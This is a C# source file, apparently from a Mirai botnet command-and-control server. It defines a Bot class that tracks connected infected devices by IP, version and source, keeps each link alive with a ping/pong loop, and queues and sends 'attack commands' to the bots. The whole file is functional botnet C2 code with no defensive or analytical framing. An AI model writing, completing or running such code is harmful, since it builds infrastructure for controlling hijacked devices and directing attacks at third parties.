using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;
using Serilog;

namespace MiraiCnCServer
{
  public class Bot
  {
    public string Id { get; private set; }
    public TcpClient Client { get; private set; }
    public string IpAddress { get; private set; }
    public byte Version { get; private set; }
    public string Source { get; private set; }
    public DateTime ConnectedAt { get; private set; }
    public DateTime LastPing { get; private set; }
    public bool IsConnected { get; private set; }
    public Dictionary<string, string> Metadata { get; private set; }

    private NetworkStream? stream;
    private Queue<byte[]> commandQueue;
    private readonly object queueLock = new object();

    public Bot(TcpClient client, string ipAddress, byte version, string source)
    {
      Id = Guid.NewGuid().ToString();
      Client = client;
      IpAddress = ipAddress;
      Version = version;
      Source = source;
      ConnectedAt = DateTime.UtcNow;
      LastPing = DateTime.UtcNow;
      IsConnected = true;
      Metadata = new Dictionary<string, string>();
      commandQueue = new Queue<byte[]>();
    }

    public async Task HandleAsync()
    {
      try
      {
        stream = Client.GetStream();
        var buffer = new byte[2];

        Log.Information($"Bot connected: {IpAddress} (v{Version}, source: {Source})");

        // Main ping/pong loop
        while (IsConnected)
        {
          // Set timeout for ping
          Client.ReceiveTimeout = 180000; // 3 minutes

          // Read ping (2 bytes)
          int read = await stream.ReadAsync(buffer, 0, 2);
          if (read != 2)
          {
            Log.Debug($"Bot {IpAddress} disconnected (invalid ping)");
            break;
          }

          LastPing = DateTime.UtcNow;

          // Send pong (echo back)
          await stream.WriteAsync(buffer, 0, 2);

          // Check for queued commands
          lock (queueLock)
          {
            while (commandQueue.Count > 0)
            {
              var cmd = commandQueue.Dequeue();
              stream.Write(cmd, 0, cmd.Length);
              Log.Debug($"Sent command to bot {IpAddress}: {cmd.Length} bytes");
            }
          }
        }
      }
      catch (Exception ex)
      {
        Log.Debug(ex, $"Bot {IpAddress} handler exception");
      }
      finally
      {
        IsConnected = false;
        Client?.Close();
        Log.Information($"Bot disconnected: {IpAddress}");
      }
    }

    public void QueueAttackCommand(byte[] command)
    {
      lock (queueLock)
      {
        commandQueue.Enqueue(command);
        Log.Debug($"Queued attack command for bot {IpAddress}");
      }
    }

    public void Disconnect()
    {
      IsConnected = false;
      Client?.Close();
    }
  }
}
